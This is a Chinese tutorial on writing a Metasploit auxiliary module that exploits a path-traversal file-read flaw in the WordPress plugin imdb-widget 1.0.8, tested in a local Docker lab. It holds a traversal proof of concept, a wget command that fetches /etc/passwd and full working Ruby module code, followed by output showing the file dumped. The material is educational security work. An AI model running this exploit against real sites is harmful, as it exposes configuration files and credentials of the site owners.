# Metasploit module开发入门篇

0x00 概述
-------

* * *

Metasploit——渗透测试神器，相信大家应该都用过或听过，drops里也有很多白帽子写过相关的文章，介绍如何使用Metasploit。使用过Metasploit的同学应该知道，Metasploit Framework是高度模块化的，即框架是由多个module组成，我们除了可以使用已有的 module，还可以自行编写module来满足自己的需求，模块化使得框架具有很好的可扩展性，这也是为什么Metasploit Framework这么受欢迎的原因之一。

看了看drops之前的文章，好像没人写过关于如何编写 Metasploit Module，刚好最近在捣鼓Metasploit，顺便复习下快遗忘的ruby，记录下自己学习的过程。

因为是入门篇，所以这里以一个非常简单WordPress Plugin的任意文件读取漏洞作为例子，搭建环境，编写自己的Auxiliary module（辅助模块），然后测试验证，介绍编写自己的 module的步骤和方法。

文中如果有说的不对或不准确的地方，欢迎大家指出～

0x01 漏洞环境
---------

* * *

漏洞环境是一个WordPress 插件[imdb-widget](https://wordpress.org/plugins/imdb-widget/)1.0.8版本的任意文件读取漏洞，缺陷代码存在于pic.php，代码：

```
<?php
header( 'Content-Type: image/jpeg' );
readfile( $_GET["url"] );

```

PoC：

```
/wp-content/plugins/imdb-widget/pic.php?url=../../../wp-config.php

```

因为 Content-Type 被设置成了 image/jpeg，所以访问后需要点击另存为文本文件，然后打开就可以获取到文件内容

可以参考[Wordpress Plugin IMDb Profile Widget 1.0.8 - Local File Inclusion](https://www.exploit-db.com/exploits/39621/)

0x02 环境搭建
---------

* * *

环境搭建包括两部分

**Metasploit**

这里使用 Kali 2.0，自带Metasploit，比较方便，下载[Prebuilt Kali Linux VirtualBox Images](https://www.offensive-security.com/kali-linux-vmware-virtualbox-image-download/)，导入VirtualBox就可以用，这里就不细说了

**WordPress 插件漏洞环境**

这里使用docker来搭建，操作系统为 Ubuntu 14.04，docker的安装大家可以 google下

拉取 WordPress image

```
docker pull wordpress:4.4.2

```

拉取 Mysql image

```
docker pull mysql:5.7.11

```

拉取过程可能会比较慢，可以装个Shadow(socks)和proxychains，再proxychains docker pull

启动 mysql container

```
docker run -d -p 3306:3306 --name mysql -e MYSQL_ROOT_PASSWORD=root mysql:5.7.11

```

启动 wordpress container

```
docker run -d --name wordpress --link mysql:mysql -p 80:80 wordpress:4.4.2

```

访问

```
http://127.0.0.1/

```

根据页面提示Install就行

接着登录后台

```
http://127.0.0.1/wp-login.php

```

下载插件imdb-widget有漏洞的[1.0.8版本](https://downloads.wordpress.org/plugin/imdb-widget.1.0.8.zip)，点击左边导航栏的 插件 - 安装插件 - 上传插件，选择刚才下载的zip包，点现在安装 - 启用插件

然后点击 外观 - 小工具，把左边的 IMDb Profile 拖到 挂件区域的第一个位置，点开设置User id，随便填一个如`ur1`，Show 随便勾选几个，点保存。主页刷新就可以看到了

[![](http://static.wooyun.org//drops/20160404/2016040416112163137.jpg)](http://drops.wooyun.org/wp-content/uploads/2016/04/F38F9F26-CDAE-4370-A01F-34416B4A297F.jpg)

测试漏洞，执行如下命令，就可以看到`/etc/passwd`的内容

```
wget -O result.txt http://127.0.0.1/wp-content/plugins/imdb-widget/pic.php?url=../../../../../../../../../etc/passwd

cat result.txt
...

```

0x03 编写Module
-------------

* * *

编写之前先简单介绍一些概念相关的东西

Metasploit中的 Module Tree 分为两种，`Primary Module Tree`和`User-Specified Module Tree`，前者用于放框架自带的module，后者用于放自己写的module.

Primary Module Tree在目录`/usr/share/metasploit-framework/modules/`下

User-Specified Module Tree 在`~/.msf7/modules/`（官网写的是~/.msf4/modules/）

Module的分类包括6种：

```
drwxr-xr-x 20 root root 4.0K Jan 28 05:38 auxiliary
drwxr-xr-x 11 root root 4.0K Jan 28 05:38 encoders
drwxr-xr-x 18 root root 4.0K Jan 28 05:38 exploits
drwxr-xr-x  9 root root 4.0K Jan 28 05:38 nops
drwxr-xr-x  5 root root 4.0K Jan 28 05:38 payloads
drwxr-xr-x 11 root root 4.0K Jan 28 05:38 post

```

根据官网的介绍，翻译过来大概意思是：

`auxiliary`：辅助模块，不带有payload的exploit，比如一些扫描模块

`payloads`：远程运行的代码，比如反弹shell的代码

`exploits`：带有payload的exploit

`encoders`：用于对payload进行编码

`nops`：保持paload大小的一致性

`post`: 获取权限后，用于后续渗透阶段的模块

因为任意读取漏洞是用于获取信息的，并不能直接获取系统权限，即不带有 payload ，因此我们要编写的module是属于auxiliary分类下的。

编写之前，我们来分析下任意文件读取漏洞auxiliary module需要完成的功能，简单来说：

1.  检查插件版本，看是否为存在漏洞的版本，如果不是，则返回invulnerable，如果是或不确定，比如获取不到版本信息，则执行2
2.  向存在漏洞的页面发送http请求，获取某个指定文件的内容，如果获取成功，则保存文件到本地。如果获取失败，有两种可能性，一是插件不存在漏洞，对应前面获取不到版本信息的情况；二是文件不存在或文件的权限问题；需要根据返回做相应处理

注：这里检查插件是否存在，应该由另一个module来完成，这里只负责检测插件是否存在漏洞

分析完后，就得开始写module了，那么这里有两种方法：

1.  找一个auxiliary module的代码skeleton，然后一点点自己写；
2.  找一个类似的已经写好的module，在它的基础上改写；

这里推荐第二种，比较适合我这种新手，有参考，写起来也容易些，那么如何找到可以参考的module呢？莫慌～

打开`msfconsole`，因为是文件读取，可以先search wordpress然后再找 read 关键词，在`msfconsole`中执行

```
msf > grep "read" search wordpress

```

找到如下几个module

```
auxiliary/scanner/http/wp_dukapress_file_read                                   normal     WordPress DukaPress Plugin File Read Vulnerability

auxiliary/scanner/http/wp_gimedia_library_file_read                             normal     WordPress GI-Media Library Plugin Directory Traversal Vulnerability

auxiliary/scanner/http/wp_imdb_profile_widget_file_read                         normal     WordPress IMDb Profile Widget Plugin File Read Vulnerability

auxiliary/scanner/http/wp_mobileedition_file_read                               normal     WordPress Mobile Edition File Read Vulnerability

auxiliary/scanner/http/wp_nextgen_galley_file_read                              normal     WordPress NextGEN Gallery Directory Read Vulnerability

auxiliary/scanner/http/wp_simple_backup_file_read                               normal     WordPress Simple Backup File Read Vulnerability

auxiliary/scanner/http/wp_subscribe_comments_file_read                          normal     WordPress Subscribe Comments File Read Vulnerability

```

这里选择`auxiliary/scanner/http/wp_dukapress_file_read`，具体文件位于`/usr/share/metasploit-framework/modules/auxiliary/scanner/http/wp_dukapress_file_read.rb`

代码如下：

```
require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Auxiliary::Report

  include Msf::Exploit::Remote::HTTP::Wordpress

  include Msf::Auxiliary::Scanner

  def initialize(info = {})

    super(update_info(info,
      'Name'           => 'WordPress DukaPress Plugin File Read Vulnerability',
      'Description'    => %q{
        This module exploits a directory traversal vulnerability in WordPress Plugin
        "DukaPress" version 2.5.2, allowing to read arbitrary files with the
        web server privileges.
      },
      'References'     =>
        [
          ['EDB', '35346'],
          ['CVE', '2014-8799'],
          ['WPVDB', '7731'],
          ['OSVDB', '115130']
        ],
      'Author'         =>
        [
          'Kacper Szurek', # Vulnerability discovery
          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit module
        ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd']),
        OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 7 ])
      ], self.class)

  end

  def check

    check_plugin_version_from_readme('dukapress', '2.5.7')

  end

  def run_host(ip)

    traversal = "../" * datastore['DEPTH']
    filename = datastore['FILEPATH']
    filename = filename[1, filename.length] if filename =~ /^\//

    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => normalize_uri(wordpress_url_plugins, 'dukapress', 'lib', 'dp_image.php'),
      'vars_get' =>
        {
          'src' => "#{traversal}#{filename}"
        }
    })

    if res && res.code == 200 && res.body.length > 0

      print_status('Downloading file...')
      print_line("\n#{res.body}")

      fname = datastore['FILEPATH']

      path = store_loot(
        'dukapress.file',
        'text/plain',
        ip,
        res.body,
        fname
      )

      print_good("#{peer} - File saved in: #{path}")
    else
      print_error("#{peer} - Nothing was downloaded. You can try to change the DEPTH parameter.")
    end

  end

end

```

看到这一堆代码，一般人都会有点晕，不知道从那里下手，莫慌，问google，搜索`metasploit write module`，搜索结果第三个，[How to get started with writing an exploit](https://github.com/rapid7/metasploit-framework/wiki/How-to-get-started-with-writing-an-exploit)，里面有一些module结构的说明. 这里对照着给了代码加了些注释：

```
# 引入msf core 库

require 'msf/core'

# 继承 Msf::Auxiliary 类

class Metasploit3 < Msf::Auxiliary

  # 引入三个 module，具体可以查看文档

  include Msf::Auxiliary::Report

  include Msf::Exploit::Remote::HTTP::Wordpress

  include Msf::Auxiliary::Scanner

  # 初始化函数

  def initialize(info = {})

    super(update_info(info,
      # [Vendor] [Software] [Root Cause] [Vulnerability type] 
      'Name'           => 'WordPress DukaPress Plugin File Read Vulnerability',
      # 描述
      'Description'    => %q{
        This module exploits a directory traversal vulnerability in WordPress Plugin
        "DukaPress" version 2.5.2, allowing to read arbitrary files with the
        web server privileges.
      },
      # 相关vulnerability 或 exploit的参考
      'References'     =>
        [
          ['EDB', '35346'],
          ['CVE', '2014-8799'],
          ['WPVDB', '7731'],
          ['OSVDB', '115130']
        ],
      # 作者
      'Author'         =>
        [
          'Kacper Szurek', # Vulnerability discovery
          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit module
        ],
      'License'        => MSF_LICENSE
    ))
    # 注册需要参数
    register_options(
      [
        # 要获取的文件路径
        OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd']),
        # 遍历深度，用于到达根目录，默认7次../
        OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 7 ])
      ], self.class)

  end

  # 用于支持 check 命令；在具体执行exploit前，检查是否存在漏洞

  def check

    # 检查dukapress版本，Wordpress module提供
    check_plugin_version_from_readme('dukapress', '2.5.7')

  end

  def run_host(ip)

    traversal = "../" * datastore['DEPTH']
    filename = datastore['FILEPATH']
    filename = filename[1, filename.length] if filename =~ /^\//
    # 发送http请求
    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => normalize_uri(wordpress_url_plugins, 'dukapress', 'lib', 'dp_image.php'),
      'vars_get' =>
        {
          'src' => "#{traversal}#{filename}"
        }
    })
    # 检查响应
    if res && res.code == 200 && res.body.length > 0

      print_status('Downloading file...')
      print_line("\n#{res.body}")

      fname = datastore['FILEPATH']
      # 保存文件
      path = store_loot(
        'dukapress.file',
        'text/plain',
        ip,
        res.body,
        fname
      )

      print_good("#{peer} - File saved in: #{path}")
    else
      print_error("#{peer} - Nothing was downloaded. You can try to change the DEPTH parameter.")
    end

  end

end

```

弄懂大概结构后，我们根据前面的分析，编写自己的module，完成后的代码如下

```
#

This module requires Metasploit: http://metasploit.com/download

Current source: https://github.com/rapid7/metasploit-framework

#

# 引入msf core 库

require 'msf/core'

# 继承 Msf::Auxiliary 类

class Metasploit3 < Msf::Auxiliary

  # 引入三个 module，照搬，具体可以查看文档

  include Msf::Auxiliary::Report

  include Msf::Exploit::Remote::HTTP::Wordpress

  include Msf::Auxiliary::Scanner

  # 初始化函数

  def initialize(info = {})

    super(update_info(info,
      # [Vendor] [Software] [Root Cause] [Vulnerability type] 
      'Name'           => 'WordPress IMDb Profile Widget Plugin File Read Vulnerability',
      # 描述
      'Description'    => %q{
        This module exploits a directory traversal vulnerability in WordPress Plugin
        "IMDb Profile Widget" version 1.0.8, allowing to read arbitrary files with the
        web server privileges.
      },
      # 相关vulnerability 或 exploit的参考
      'References'     =>
        [
          ['URL', 'https://www.exploit-db.com/exploits/39621/']
        ],
      # 作者
      'Author'         =>
        [
          'CrashBandicot @DosPerl', # Vulnerability discovery
          'blinking.yan <blinking.yan[at]gmail.com>' # Metasploit module
        ],
      'License'        => MSF_LICENSE
    ))
    # 注册需要参数
    register_options(
      [
        OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd']),
        OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 7 ])
      ], self.class)

  end

  # 用于支持 check 命令；在具体执行exploit前，检查是否存在漏洞

  def check

    # 检查imdb-widget版本
    check_plugin_version_from_readme('imdb-widget', '1.0.8')

  end

  # 执行exploit

  def run_host(ip)

    traversal = "../" * datastore['DEPTH']
    filename = datastore['FILEPATH']
    filename = filename[1, filename.length] if filename =~ /^\//
    # 发送读取文件的http请求
    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => normalize_uri(wordpress_url_plugins, 'imdb-widget', 'pic.php'),
      'vars_get' =>
        {
          'url' => "#{traversal}#{filename}"
        }
    })
    # 检查响应
    if res && res.code == 200 && res.body.length > 0
      # 文件不存在
      if res.body.include? 'No such file or directory' 
        print_error("#{peer} - Nothing was downloaded. No such file or directory: /#{filename}. Please change the DEPTH parameter.")
      # 文件读取权限问题
      elsif res.body.include? 'Permission denied'
        print_error("#{peer} - Nothing was downloaded. Permission denied: /#{filename}. Please change the DEPTH parameter.")
      else
        print_status('Downloading file...')
        print_line("\n#{res.body}")

        fname = datastore['FILEPATH']
        # 保存文件
        path = store_loot(
          'imdb-widget.file',
          'text/plain',
          ip,
          res.body,
          fname
        )

        print_good("#{peer} - File saved in: #{path}")
      end
    else
      print_error("#{peer} - Http Response Code is not 200 or Plugin is not vulnerable")
    end

  end

end

```

可以看到，改动的地方并不是很多。

因此我们并不需要弄懂所有的类和方法，也可以写出自己的module。

代码中发送http请求部分可以参考：[How to Send an HTTP Request Using HTTPClient](https://github.com/rapid7/metasploit-framework/wiki/How-to-Send-an-HTTP-Request-Using-HTTPClient)

0x04 测试Module
-------------

* * *

前面提到，msf有专门的目录`~/.msf7/modules/`来存放自己编写的module，这里对照着`auxiliary/scanner/http/wp_dukapress_file_read`，创建目录

```
mkdir -p  ~/.msf7/modules/auxiliary/scanner/http/

```

将代码保存`~/.msf7/modules/auxiliary/scanner/http/`目录下，文件名为`wp_imdb_profile_widget_file_read.rb`，重启msfconsole，加载自定义module，执行

```
msfconsole -m ~/.msf7/modules

```

查看下插件是否已经被load

```
msf > grep "imdb" search wordpress

auxiliary/scanner/http/wp_imdb_profile_widget_file_read                         normal     WordPress IMDb Profile Widget Plugin File Read Vulnerability

```

对前面的漏洞环境进行测试，这里wordpress的ip为`192.168.1.191`

```
msf > use auxiliary/scanner/http/wp_imdb_profile_widget_file_read

msf auxiliary(wp_imdb_profile_widget_file_read) > show options 

Module options (auxiliary/scanner/http/wp_imdb_profile_widget_file_read):

   Name       Current Setting  Required  Description

---

   DEPTH      7                yes       Traversal Depth (to reach the root folder)

   FILEPATH   /etc/passwd      yes       The path to the file to read

   Proxies                     no        A proxy chain of format type:host:port,type:host:port

   RHOSTS                      yes       The target address range or CIDR identifier

   RPORT      80               yes       The target port

   TARGETURI  /                yes       The base path to the wordpress application

   THREADS    1                yes       The number of concurrent threads

   VHOST                       no        HTTP server virtual host

msf auxiliary(wp_imdb_profile_widget_file_read) > set rhosts 192.168.1.191

rhosts => 192.168.1.191

msf auxiliary(wp_imdb_profile_widget_file_read) > run

[*] Downloading file...

root:x:0:0:root:/root:/bin/bash

daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

bin:x:2:2:bin:/bin:/usr/sbin/nologin

sys:x:3:3:sys:/dev:/usr/sbin/nologin

sync:x:4:65534:sync:/bin:/bin/sync

games:x:5:60:games:/usr/games:/usr/sbin/nologin

man:x:6:12:man:/var/cache/man:/usr/sbin/nologin

lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin

mail:x:8:8:mail:/var/mail:/usr/sbin/nologin

news:x:9:9:news:/var/spool/news:/usr/sbin/nologin

uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin

proxy:x:13:13:proxy:/bin:/usr/sbin/nologin

www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

backup:x:34:34:backup:/var/backups:/usr/sbin/nologin

list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin

irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin

gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin

nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin

systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false

systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false

systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false

systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false

[+] 192.168.1.191:80 - File saved in: /root/.msf7/loot/20160403132842default192.168.1.191imdbwidget.file266865.txt

[*] Scanned 1 of 1 hosts (100% complete)

[*] Auxiliary module execution completed

msf auxiliary(wp_imdb_profile_widget_file_read) > 

```

成功读取到/etc/passwd，测试成功～

0x05 结论
-------

* * *

文章主要介绍的是如何去编写module的方法，有的地方可能写的不是很详细。总结来说就是： 在接触一个新的东西时，参考别人已经写好的东西，然后修修改改，是一种很好快速入门的方法。